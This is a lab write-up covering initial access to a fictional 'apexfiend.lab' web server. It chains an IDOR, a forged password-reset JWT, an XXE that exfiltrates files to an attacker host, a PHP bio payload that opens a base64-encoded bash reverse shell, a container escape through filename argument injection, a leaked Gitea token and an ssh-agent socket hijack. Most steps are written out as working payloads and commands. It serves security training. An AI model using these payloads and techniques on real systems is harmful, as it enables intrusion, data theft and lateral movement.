# Writeup — 01. Initial Access (WEB01)

> Companion reasoning-level document: [`docs/08-attack-paths/initial-access.md`](../docs/08-attack-paths/initial-access.md)

## Recon

Visiting `https://www.apexfiend.lab/` presents a commercial decoy site ("Infraestructura global de gestión de marca, soluciones empresariales e innovación tecnológica para la red corporativa"). Four endpoints are advertised:

- `https://webmail.apexfiend.lab/`
- `https://www.apexfiend.lab/register/index.php`
- `https://portal.apexfiend.lab/`
- `https://job.apexfiend.lab/`

## Registering a Disposable Mailbox and a Portal Account

`portal.apexfiend.lab` requires an account, which requires email verification. A disposable mailbox is created via `register/index.php`:

```
test123@apex-guest.lab : Passw0rd!
```

Confirmed via `webmail.apexfiend.lab`. The same credentials (`test123:Passw0rd!`) are reused to register a `portal.apexfiend.lab` account, confirmed via the activation link sent to the disposable mailbox:

```
https://portal.apexfiend.lab/index.php?activate=dXNlcm5hbWU9dGVzdDEyMyZlbWFpbD10ZXN0MTIzJTQwYXBleC1ndWVzdC5sYWImdD0xNzkyMTUxMTA1
```

```
✔ ¡Su cuenta ha sido activada con éxito! Ya puede iniciar sesión.
```

Logging in confirms the profile is Entity ID `#USR-0032`, with options to generate a TOTP QR code, upload an SVG avatar, and set a bio.

## IDOR — Leaking Another User's TOTP QR (admin)

Clicking "generar/ver código" in Burp Suite captures:

```http
GET /get_qr.php HTTP/1.1
Host: portal.apexfiend.lab
Cookie: PHPSESSID=1216ab3f82471b649678158a6548040f
X-Target-Hash: 6364d3f0f495b6ab9dcf8d3b5c6e0b01
...
```

`X-Target-Hash` is an unsalted MD5 of the numeric user ID (32):

```
$ echo -n "32" | md5sum
6364d3f0f495b6ab9dcf8d3b5c6e0b01  -
```

Computing the hash for user ID `1` instead:

```
$ echo -n "1" | md5sum
c4ca4238a0b923820dcc509a6f75849b  -
```

Replaying the request with the substituted hash via Burp returns user ID 1's TOTP QR code. Scanning it confirms the label "Apex Brand Hub:admin" — this is the `admin` account.

## Forging the Password-Reset JWT

With the admin's TOTP code readable from the leaked QR, "¿olvidó su contraseña?" is used with `test123:780936` (TOTP). The reset email contains:

```
https://portal.apexfiend.lab/reset_password.php?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjozMiwidXNlcm5hbWUiOiJ0ZXN0MTIzIiwiaWF0IjoxNzkyMTUyNTc3LCJleHAiOjE3OTIxNTYxNzd9.p7zRuJWsGd3v_t80V2xcq3qQ04FsVhTHnLpObtTUlis
```

Decoded payload: `{"user_id":32,"username":"test123",...}`. Editing the payload to `{"user_id":1,"username":"admin",...}` and **reusing the original signature unchanged** is accepted by the server:

```
https://portal.apexfiend.lab/reset_password.php?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzkyMTUyNTc3LCJleHAiOjE3OTIxNTYxNzd9.p7zRuJWsGd3v_t80V2xcq3qQ04FsVhTHnLpObtTUlis
```

The reset form asks for the TOTP code, username, and new password. Submitting `admin:393107:Passw0rd!` succeeds — full control of the `admin` account, including the admin panel listing every registered user and their data.

## XXE in SVG Upload → Source Disclosure

Back on the regular user, uploading an SVG (`alien.svg`) with an injected external DTD and capturing via Burp:

```xml
<!DOCTYPE svg [
  <!ENTITY % test SYSTEM "http://10.0.100.4/remote.dtd"> %test;
]>
```

`remote.dtd`, served from an attacker-controlled Python HTTP server:

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.0.100.4/?data=%file;'>">
%eval;
%exfil;
```

```
$ python3 -m http.server 80
10.0.100.6 - - [16/Oct/2026 05:30:50] "GET /remote.dtd HTTP/1.1" 200 -
10.0.100.6 - - [16/Oct/2026 05:30:50] "GET /?data=<base64> HTTP/1.1" 200 -
```

The first read confirms the primitive but the wrong path. Retrying against `php://filter/convert.base64-encode/resource=/var/www/html/portal/config.php` and decoding reveals:

```php
<?php
/**
 * Apex Brand Hub - Core Configuration & Bootstrap
 * Environment: Production Cluster WEB01
 * Path: /var/www/html/portal/includes/config.php
 */
define('DB_HOST', 'localhost');
// <DB credentials redacted>

$GLOBALS['INTERNAL_ROUTES'] = [
    'legacy_status'       => '/portal/status_v1.php',
    'old_metrics'         => '/portal/metrics_debug.php',
    'temp_preview'        => '/portal/preview_profile.php', // TODO: Restricted access pending SSO migration
    'test_upload_handler' => '/portal/test_svg_upload.php', // TODO: Restricted to admin
    'debug_logger'        => '/portal/logger_dump.php',
    'internal_metrics'    => '/server-status',
    'admin_panel_legacy'  => '/portal/admin.php' // TODO: Deprecated, ensure firewall blocks this externally
];

$GLOBALS['APP_CONFIG'] = [
    'name' => 'Apex Brand Hub Portal',
    'version' => '3.2.0-stable',
    'allowed_domains' => ['apexfiend.lab', 'contoso.local', 'internal.apex.lab'],
    'feature_flags' => [
        'enable_svg_vectorizer' => true, // Warning: Requires strict XML sanitization review
        'enable_oauth_login'    => false,
        'beta_jwt_auth'         => true
    ]
];
?>
```

## LFI → RCE via Session File Inclusion

`/preview_profile.php?file=includes/template_card.php` turns out to be a template renderer vulnerable to path traversal. The profile "description" field accepts and stores raw PHP. With the attacker's own `PHPSESSID` known (`4d755cc4c53d91946c984b8066061dc9`) from the browser (F12), the bio is set to:

```php
<?php system("echo YmFzaCAtYyAiIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4xMDAuNC80NDMgMD4mMSAi | base64 -d| bash");?>
```

A netcat listener is started (`nc -nvlp 443`), and the LFI is pointed at the session file via path traversal:

```
https://portal.apexfiend.lab/preview_profile.php?file=....//....//....//....//....//....//var/lib/php/sessions/sess_4d755cc4c53d91946c984b8066061dc9
```

```
www-data@272cac4e4841:/var/www/html/portal$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Container Escape via Filename Argument Injection

In the `uploads` directory:

```bash
echo 'echo YmFzaCAtYyAiIGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4xMDAuNC80NDMgMD4mMSAi | base64 -d | bash' > test.svg
touch -- '-e sh test.svg'
```

A second netcat listener on port 443 catches a shell on the **host**, as `dev`:

```
dev@web01:/opt/portal-docker/portal/uploads$
```

## Git Secret Recovery — internal-dashboard

```
dev@web01:/opt/dashboard/internal-dashboard$ git fsck --unreachable
...
unreachable commit 6291353532774e07b00831fecc7608fb6ae20d07
...
dev@web01:/opt/dashboard/internal-dashboard$ git show 6291353532774e07b00831fecc7608fb6ae20d07
commit 6291353532774e07b00831fecc7608fb6ae20d07
Author: dev <dev@web01.apexfiend.lab>
Date:   Wed Sep 9 00:44:23 2026 -0400

    wip: Gitea integration debugging, remove before merge

diff --git a/src/config.debug.php b/src/config.debug.php
new file mode 100644
index 0000000..b3a2322
--- /dev/null
+++ b/src/config.debug.php
@@ -0,0 +1,3 @@
+<?php
+// TODO: remove before merging into main - temporary token to test the Gitea API
+// GITEA_TOKEN=38608c6e038821b73eafb264880c4167f5dff315
```

`/etc/hosts` reveals the internal Gitea resolution:

```
172.16.40.100 gitea.apexfiend.lab
172.16.30.100 www.apexfiend.lab
```

```bash
curl -H "Authorization: token 38608c6e038821b73eafb264880c4167f5dff315" https://gitea.apexfiend.lab/api/v1/user/repos | jq | grep clone
# "clone_url": "https://gitea.apexfiend.lab/dev/developer-deployment.git"
# "clone_url": "https://gitea.apexfiend.lab/dev/internal-dashboard.git"
```

```bash
mkdir /tmp/.ttt && cd /tmp/.ttt
git clone https://dev:38608c6e038821b73eafb264880c4167f5dff315@gitea.apexfiend.lab/dev/developer-deployment.git
```

## developer-deployment — Pointing at DEV-LAPTOP

```
commit 5902ba08bed7960de50a408e987352ddb26d091f
Author: dev <dev@web01.apexfiend.lab>

    fix: correct Windows backup path notation & IP address

diff --git a/config/development.env b/config/development.env
new file mode 100644
+# Remote Workstation / Deployment Target
+# NOTE: Do NOT store SSH private keys on disk. Authentication relies on forwarded ssh-agent sockets.
+REMOTE_HOST=10.0.100.12
+REMOTE_HOSTNAME=DEV-LAPTOP
+REMOTE_USER=developer
```

## Pivoting via the Live Forwarded Agent Socket

```
dev@web01:~$ ls -la /tmp/ssh-*/agent.*
srwxrwxr-x 1 dev dev 0 Oct 16 23:40 /tmp/ssh-dtlY3aJkkj/agent.30540
dev@web01:~$ export SSH_AUTH_SOCK=/tmp/ssh-dtlY3aJkkj/agent.30540
dev@web01:~$ ssh-add -l
256 SHA256:tX7OezKO3n5E73Rxw6xi73D4mkRF+TFOX0Ila755a4A developer@DEV-LAPTOP (ED25519)
dev@web01:~$ ssh developer@10.0.100.12

Microsoft Windows [Version 10.0.26200.8037]
developer@DEV-LAPTOP C:\Users\developer>whoami
dev-laptop\developer
```

Continues in [`02-web-to-vpn.md`](02-web-to-vpn.md).
